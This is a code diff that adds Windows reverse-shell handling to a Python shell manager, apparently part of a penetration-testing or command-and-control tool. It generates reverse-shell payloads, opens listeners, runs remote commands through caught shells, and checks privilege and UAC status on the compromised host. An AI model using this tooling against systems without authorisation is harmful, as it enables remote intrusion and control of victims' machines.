@@ -28,6 +28,8 @@ from .executor import CommandExecutor
 from .payloads import ShellPayloads
 from .state import ShellState
 from .tmux_backend import TmuxBackend
+from .windows_executor import WindowsExecutor
+from .windows_payloads import WindowsPayloads
 
 logger = logging.getLogger(__name__)
 
@@ -44,6 +46,7 @@ class ShellManager:
         self.database = database
         self.tmux = TmuxBackend()
         self.executor = CommandExecutor()
+        self.windows_executor = WindowsExecutor()
         self.state = ShellState()
         self._listeners: dict[str, socket.socket] = {}
         self._listener_threads: dict[str, threading.Thread] = {}
@@ -513,8 +516,11 @@ class ShellManager:
             repo = ShellRepository(session)
             shell = repo.get_or_raise(shell_id)
 
-            # Close executor session
-            self.executor.close_shell(shell_id)
+            # Close executor session based on OS type
+            if shell.os_type == OSType.WINDOWS:
+                self.windows_executor.close_shell(shell_id)
+            else:
+                self.executor.close_shell(shell_id)
 
             # Kill tmux session if exists
             if shell.tmux_session:
@@ -584,3 +590,315 @@ class ShellManager:
 
         except Exception as e:
             logger.debug(f"Failed to update shell state for {shell_id}: {e}")
+
+    def create_windows_shell(
+        self,
+        name: str,
+        target_host: str,
+        shell_program: ShellProgram = ShellProgram.POWERSHELL,
+        tunnel_id: str | None = None,
+        local_port: int | None = None,
+        payload_type: str = "powershell",
+        use_tmux: bool = False,
+        timeout: int = 30,
+    ) -> tuple[ShellModel, str]:
+        """Create a Windows reverse shell.
+
+        Args:
+            name: Shell name
+            target_host: Target host (for documentation)
+            shell_program: Shell program (POWERSHELL or CMD)
+            tunnel_id: Tunnel ID if using tunnel
+            local_port: Local port to listen on (auto-assigned if None)
+            payload_type: Payload type (powershell, powershell_encoded, cmd, wmi)
+            use_tmux: Whether to use tmux for persistence (not recommended for Windows)
+            timeout: Timeout in seconds to wait for connection
+
+        Returns:
+            Tuple of (shell model, payload command)
+
+        Raises:
+            ShellLimitExceeded: If max shells limit reached
+            ShellCreationFailed: If shell creation fails
+        """
+        with self.database.session() as session:
+            repo = ShellRepository(session)
+
+            # Check shell limit
+            active_count = len(repo.list_active())
+            if active_count >= settings.shell.max_shells:
+                raise ShellLimitExceeded(active_count, settings.shell.max_shells)
+
+            # Auto-assign port if not provided
+            if local_port is None:
+                local_port = self._find_available_port()
+
+            # Generate Windows payload
+            local_ip = "0.0.0.0"  # Listen on all interfaces
+            payload = WindowsPayloads.get_windows_payload(
+                payload_type, local_ip, local_port
+            )
+
+            # Create shell record
+            shell_data = {
+                "name": name,
+                "shell_type": ShellType.REVERSE.value,
+                "os_type": OSType.WINDOWS.value,
+                "shell_program": shell_program.value,
+                "status": ShellStatus.ACTIVE.value,
+                "tunnel_id": tunnel_id,
+                "target_host": target_host,
+                "target_port": local_port,
+                "tmux_session": f"amp-shell-{name}" if use_tmux else None,
+                "privilege_level": PrivilegeLevel.USER.value,
+                "config": {
+                    "payload_type": payload_type,
+                    "local_port": local_port,
+                },
+            }
+
+            shell_model = repo.create(shell_data)
+            session.commit()
+
+            # Start listener
+            try:
+                self._start_reverse_listener(
+                    shell_model.id,
+                    local_port,
+                    use_tmux,
+                    timeout,
+                )
+            except Exception as e:
+                # Clean up on failure
+                repo.update_status(shell_model.id, ShellStatus.DEAD)
+                session.commit()
+                raise ShellCreationFailed(
+                    reason=f"Failed to start Windows listener: {e}",
+                    target=target_host,
+                ) from e
+
+            logger.info(
+                f"Created Windows shell {shell_model.id} ({name}) "
+                f"listening on port {local_port}"
+            )
+
+            return shell_model, payload
+
+    def execute_windows_command(
+        self,
+        shell_id: str,
+        command: str,
+        timeout: int = 30,
+    ) -> ExecuteCommandResponse:
+        """Execute command in Windows shell session.
+
+        Args:
+            shell_id: Shell ID
+            command: Command to execute
+            timeout: Timeout in seconds (default: 30)
+
+        Returns:
+            Command execution response
+
+        Raises:
+            ShellNotFound: If shell not found
+            ShellTimeout: If command times out
+        """
+        with self.database.session() as session:
+            shell_repo = ShellRepository(session)
+            op_repo = OperationRepository(session)
+
+            # Verify shell exists and is Windows
+            shell = shell_repo.get_or_raise(shell_id)
+            if shell.os_type != OSType.WINDOWS:
+                raise ValueError(f"Shell {shell_id} is not a Windows shell")
+
+            # Check if shell is alive
+            if not self.windows_executor.is_alive(shell_id):
+                shell_repo.update_status(shell_id, ShellStatus.DEAD)
+                session.commit()
+                raise ShellDied(shell_id, "Windows shell process is not alive")
+
+            # Execute command based on shell program
+            start_time = time.time()
+            try:
+                if shell.shell_program == ShellProgram.POWERSHELL:
+                    result = self.windows_executor.execute_powershell(
+                        shell_id, command, timeout
+                    )
+                elif shell.shell_program == ShellProgram.CMD:
+                    result = self.windows_executor.execute_cmd(
+                        shell_id, command, timeout
+                    )
+                else:
+                    raise ValueError(f"Unsupported Windows shell program: {shell.shell_program}")
+            except Exception as e:
+                # Record failed operation
+                duration_ms = int((time.time() - start_time) * 1000)
+                op_data = {
+                    "operation_type": OperationType.COMMAND.value,
+                    "shell_id": shell_id,
+                    "command": command,
+                    "stdout": "",
+                    "stderr": str(e),
+                    "exit_code": -1,
+                    "duration_ms": duration_ms,
+                    "success": False,
+                }
+                operation = op_repo.create(op_data)
+                session.commit()
+                raise
+
+            # Record operation
+            op_data = {
+                "operation_type": OperationType.COMMAND.value,
+                "shell_id": shell_id,
+                "command": command,
+                "stdout": result.stdout,
+                "stderr": result.stderr,
+                "exit_code": result.exit_code,
+                "duration_ms": result.duration_ms,
+                "success": result.success,
+            }
+            operation = op_repo.create(op_data)
+
+            # Update shell activity
+            shell_repo.update_activity(shell_id)
+            session.commit()
+
+            logger.info(
+                f"Executed Windows command in shell {shell_id}: {command} "
+                f"(exit_code={result.exit_code})"
+            )
+
+            return ExecuteCommandResponse(
+                operation_id=operation.id,
+                stdout=result.stdout,
+                stderr=result.stderr,
+                exit_code=result.exit_code,
+                duration_ms=result.duration_ms,
+                success=result.success,
+            )
+
+    def detect_os(self, shell_id: str) -> OSType:
+        """Detect operating system of shell target.
+
+        Args:
+            shell_id: Shell ID
+
+        Returns:
+            Detected OS type
+
+        Raises:
+            ShellNotFound: If shell not found
+        """
+        with self.database.session() as session:
+            repo = ShellRepository(session)
+            shell = repo.get_or_raise(shell_id)
+
+            # Try to detect OS by running commands
+            try:
+                # Try Linux command
+                result = self.executor.execute(shell_id, "uname -s", timeout=5)
+                if result.success and ("linux" in result.stdout.lower() or "unix" in result.stdout.lower()):
+                    return OSType.LINUX
+            except Exception:
+                pass
+
+            try:
+                # Try Windows command
+                win_result = self.windows_executor.execute_powershell(
+                    shell_id, "$env:OS", timeout=5
+                )
+                if win_result.success and "windows" in win_result.stdout.lower():
+                    return OSType.WINDOWS
+            except Exception:
+                pass
+
+            # Return current OS type if detection fails
+            return shell.os_type
+
+    def update_windows_shell_state(self, shell_id: str) -> None:
+        """Update Windows shell state (cwd, env, privilege, UAC).
+
+        Args:
+            shell_id: Shell ID
+
+        Raises:
+            ShellNotFound: If shell not found
+        """
+        with self.database.session() as session:
+            repo = ShellRepository(session)
+            shell = repo.get_or_raise(shell_id)
+
+            if shell.os_type != OSType.WINDOWS:
+                raise ValueError(f"Shell {shell_id} is not a Windows shell")
+
+            try:
+                # Detect working directory
+                if shell.shell_program == ShellProgram.POWERSHELL:
+                    result = self.windows_executor.execute_powershell(
+                        shell_id, "pwd | Select-Object -ExpandProperty Path", timeout=5
+                    )
+                else:
+                    result = self.windows_executor.execute_cmd(shell_id, "cd", timeout=5)
+
+                if result.success:
+                    cwd = result.stdout.strip()
+                    self.state.update_cwd(shell_id, cwd)
+                    repo.update_working_directory(shell_id, cwd)
+                    session.commit()
+
+                # Detect privilege level
+                if shell.shell_program == ShellProgram.POWERSHELL:
+                    result = self.windows_executor.execute_powershell(
+                        shell_id, "whoami", timeout=5
+                    )
+                else:
+                    result = self.windows_executor.execute_cmd(shell_id, "whoami", timeout=5)
+
+                if result.success:
+                    privilege = self.state.detect_windows_privilege(result.stdout)
+                    self.state.update_privilege(shell_id, privilege)
+
+                # Detect UAC status (PowerShell only)
+                if shell.shell_program == ShellProgram.POWERSHELL:
+                    result = self.windows_executor.execute_powershell(
+                        shell_id,
+                        "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name EnableLUA | Select-Object -ExpandProperty EnableLUA",
+                        timeout=5,
+                    )
+                    if result.success:
+                        uac_enabled = self.state.detect_uac_status(result.stdout)
+                        logger.debug(f"UAC status for shell {shell_id}: {uac_enabled}")
+
+            except Exception as e:
+                logger.debug(f"Failed to update Windows shell state for {shell_id}: {e}")
+
+    def _find_available_port(self, start_port: int = 4444, end_port: int = 5000) -> int:
+        """Find an available port for listening.
+
+        Args:
+            start_port: Start of port range
+            end_port: End of port range
+
+        Returns:
+            Available port number
+
+        Raises:
+            ShellCreationFailed: If no available port found
+        """
+        for port in range(start_port, end_port):
+            try:
+                # Try to bind to the port
+                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                test_socket.bind(("0.0.0.0", port))
+                test_socket.close()
+                return port
+            except OSError:
+                continue
+
+        raise ShellCreationFailed(
+            reason=f"No available ports in range {start_port}-{end_port}",
+            target="localhost",
+        )
